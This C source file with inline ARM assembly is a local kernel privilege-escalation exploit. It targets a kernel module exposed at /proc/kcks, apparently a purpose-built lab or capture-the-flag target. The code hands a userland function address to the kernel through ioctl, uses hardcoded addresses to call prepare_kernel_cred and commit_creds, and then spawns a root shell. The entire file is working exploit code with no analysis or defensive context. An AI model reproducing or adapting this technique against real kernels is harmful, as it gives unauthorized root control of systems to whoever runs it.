#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>

void payload(void)
{
    if (getuid() == 0)
    {
        write(1, "start\n", 7);
        system("sh");
        write(1, "over\n", 6);
    }
    else
    {
        puts("failed to get root. How did we even get here?");
    }

    _exit(0);
}

long rip;

void shell(void)
{

    asm(
        "MOV     R0, #0;"
        "BL     0xc0365d3c;" // addr prepare_kernel_cred
        "BL     0xc0365e3c;" // addr commit_cred
        "MSR    CPSR_c,#0x40000010;"
        "BL 0x00010564;" // addr payload()
    );
}

typedef struct req_userland
{
    unsigned long address;
} req_userland;

int main()
{
    signal(SIGSEGV, payload);
    int fd;
    req_userland uland;
    fd = open("/proc/kcks", O_RDWR);
    uland.address = &shell;
    printf("addres uland @ 0x%x\n", &uland);
    printf("value of uland 0x%x \n", uland);

    ioctl(fd, 0, &uland);

    payload();
    return 0;
}